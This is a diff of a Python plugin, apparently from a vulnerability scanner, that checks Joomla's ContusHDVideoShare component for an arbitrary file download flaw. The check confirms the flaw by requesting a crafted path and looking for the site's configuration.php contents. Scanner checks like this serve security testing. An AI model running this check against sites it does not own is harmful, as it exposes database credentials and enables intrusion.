@@ -1,15 +1,18 @@
-from ..miniCurl import Curl
-from ..t  import T
 #!/usr/bin/env python
+# encoding: utf-8
+
 """
 Joomla ContusHDVideoShare com_contushdvideoshare - Arbitrary File Download Vulnerability
 http://cn.1337day.com/exploit/23186
 """
+from ..miniCurl import Curl
+from ..t  import T
+from termcolor import cprint
 
 class P(T):
     def __init__(self):
         T.__init__(self)
-    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
+    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
         arg='http://'+ip+':'+port+'/'
         curl=Curl()
         result = {}
@@ -19,7 +22,8 @@ class P(T):
         url = arg + payload
         code, head, res, errcode, _ = curl.curl(url)
         if code == 200 and 'class JConfig' in res:#the joomla configuration.php contain the words "class JConfig"
-             output(url,result,'warning')
+	    cprint(url + '存在joomla Vul漏洞', 'yellow')
+	    output(url,result,'warning')
     
 
         del curl
